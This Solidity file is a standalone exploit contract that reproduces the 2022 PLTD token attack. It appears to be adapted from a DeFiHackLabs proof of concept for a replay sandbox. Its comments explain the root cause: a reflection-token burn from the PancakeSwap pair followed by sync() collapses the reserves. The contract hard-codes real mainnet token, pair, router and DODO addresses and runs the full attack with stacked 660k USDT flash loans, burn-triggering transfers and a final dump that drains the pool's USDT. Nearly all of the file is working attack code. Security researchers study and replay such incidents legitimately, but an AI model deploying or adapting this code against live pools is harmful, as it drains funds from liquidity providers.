// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-PLTD).
//
// The DeFiHackLabs PoC (test/PLTD_exp.sol) runs the attack INLINE in the Foundry
// `ContractTest` harness — both stacked DODO flash-loan callbacks
// (`DPPFlashLoanCall`) live on the test itself, and `address(this)` is the
// recipient of every swap and the profit. There is no standalone contract to
// deploy. This file is a faithful, self-contained copy of that inline attack
// (testExploit body + nested DPPFlashLoanCall callback + minimal inline
// interfaces — no imports so it compiles anywhere), compiled inside the registry
// forge project. Logic, constants, and the 50%-of-sell `_bron` mechanic are
// copied verbatim from test/PLTD_exp.sol.
//
// Root cause: PLTD is a reflection/fee-on-transfer token whose sell branch
// (`_tokenTransferSell`) accumulates a counter `_bron += 50% of every sold
// amount`, and whose plain-transfer branch (`_tokenTransfer`) — fired by ANY
// user-to-user transfer once `_bron > 0` — burns that many PLTD DIRECTLY OUT OF
// the PancakeSwap pair (`_bronTransfer(uniswapV2Pair, dead, _bron)`) and then
// calls `pair.sync()`. That is an un-compensated removal of one side of the
// pool's reserves: PLTD is deleted from the pair, no USDT leaves, and sync()
// forces the pair to accept the shrunken PLTD balance as its new reserve. k
// collapses and PLTD becomes almost free to acquire against the untouched USDT
// side. The attacker drives `_bron` to equal the pool's entire PLTD reserve by
// selling `2 × reserve − 1`, then triggers the burn with a 1-PLTD plain
// transfer, then dumps into the degenerate pool for ~all the USDT.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDVM {
    // DODO V2 DVM/DPP pool flash loan. Optimistically sends quoteAmount of USDT
    // to assetTo, then calls DPPFlashLoanCall(assetTo, 0, quoteAmount, data).
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IUniPair {
    function skim(address to) external;
    function sync() external;
}

interface IUniRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract PLTDDrain {
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant PLTD = IERC20(0x29b2525e11BC0B0E9E59f705F318601eA6756645);
    IUniPair constant Pair = IUniPair(0x4397C76088db8f16C15455eB943Dd11F2DF56545);
    IUniRouter constant Router = IUniRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant dodo1 = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE; // DPPAdvanced (220k USDT)
    address constant dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A; // DPPOracle  (440k USDT)

    // entrypoint — mirrors ContractTest.testExploit(): approve the router for both
    // tokens, then kick off the outermost DODO flash loan (220k USDT). The nested
    // callback borrows another 440k USDT, runs the attack, and repays both loans.
    function run() external {
        USDT.approve(address(Router), type(uint256).max);
        PLTD.approve(address(Router), type(uint256).max);
        IDVM(dodo1).flashLoan(0, 220_000 * 1e18, address(this), new bytes(1));
    }

    // DODO V2 flash-loan callback (DPPFlashLoanCall), copied verbatim from the
    // test. msg.sender identifies which of the two stacked loans is settling.
    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        if (msg.sender == dodo1) {
            // Outer loan: stack the inner 440k USDT loan, then repay dodo1.
            IDVM(dodo2).flashLoan(0, 440_000 * 1e18, address(this), new bytes(1));
            USDT.transfer(dodo1, 220_000 * 1e18);
        }
        if (msg.sender == dodo2) {
            // Inner loan: this is where the actual exploit runs (660k USDT in hand).
            _usdtToPLTD();
            // Sell-back 2×pairPLTD − 1 to accrue _bron == pairPLTD (50% of sold).
            uint256 amount = PLTD.balanceOf(address(Pair));
            PLTD.transfer(address(Pair), amount * 2 - 1);
            // skim the excess PLTD back (buy-side transfer → _bron survives).
            Pair.skim(address(this));
            // Trigger the burn with a 1-PLTD plain transfer: _bron PLTD is deleted
            // from the pair to 0xdEaD and pair.sync() collapses the PLTD reserve.
            PLTD.transfer(tx.origin, 1e18);
            // Dump into the now-degenerate pool for ~all the USDT.
            _pltdToUSDT();
            // Repay the inner 440k USDT flash loan.
            USDT.transfer(dodo2, 440_000 * 1e18);
        }
    }

    function _usdtToPLTD() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(PLTD);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            660_000 * 1e18, 0, path, address(this), block.timestamp
        );
    }

    function _pltdToUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(PLTD);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            PLTD.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
